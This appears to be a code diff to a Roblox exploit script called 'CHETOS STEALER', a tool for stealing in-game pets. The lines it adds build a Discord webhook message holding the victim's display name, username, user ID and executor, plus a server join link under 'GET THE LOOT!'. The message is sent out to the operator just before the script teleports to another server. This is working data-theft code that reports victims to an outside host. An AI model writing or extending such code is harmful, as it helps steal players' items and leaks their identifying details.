@@ -244,8 +244,19 @@ else
                 local destinationJobId = servers[math.random(1, #servers)]
                 local teleportData = { source = SECRET_HANDSHAKE, destinationId = destinationJobId }
                 
-                print("Hopping to server: " .. destinationJobId)
-                task.wait(0.1)
+                local join_link = string.format("[Join Server](https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s)", PlaceId, destinationJobId)
+                local teleport_command = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")\n```", PlaceId, destinationJobId)
+                local description = table.concat({"**👤 Player Information**","```",("😭 Display Name: %s"):format(player.DisplayName),("👤 Username: @%s"):format(player.Name),("👁️ User ID: %d"):format(player.UserId),("🦸 Receiver: %s"):format(getgenv().receiver or "N/A"),("💻 Executor: %s"):format(getExecutorName()),("🌐 Server: %d/%d"):format(#Players:GetPlayers(), Players.MaxPlayers),"```","**🔗 SERVER ACCESS - GET THE LOOT!**","Hopping to a new server. Victim details will be sent upon arrival.",join_link},"\n")
+                local embed = {title="🐾 **CHETOS STEALER - HOPPING**",color=16705372,description=description,footer={text="CHETOS STEALER",icon_url="https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&"},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}
+                local payload = {username=" CHETOS PETS STEALER",avatar_url="https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",embeds={embed}}
+                payload.content = teleport_command .. "\n" .. CONFIG["PING_MESSAGE"]
+                payload.allowed_mentions = {parse={"everyone"}}
+                local payload_log = {username="CHETOS LOGS",avatar_url="https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",embeds={{title="Server Hop",description="Hopping to new server: " .. destinationJobId,color=16705372}}}
+                
+                sendAllDestinations(payload, payload_log, false)
+                
+                print("Webhook sent. Hopping to server: " .. destinationJobId)
+                task.wait(1)
                 TeleportService:TeleportToPlaceInstance(PlaceId, destinationJobId, player, nil, teleportData)
                 return
             end
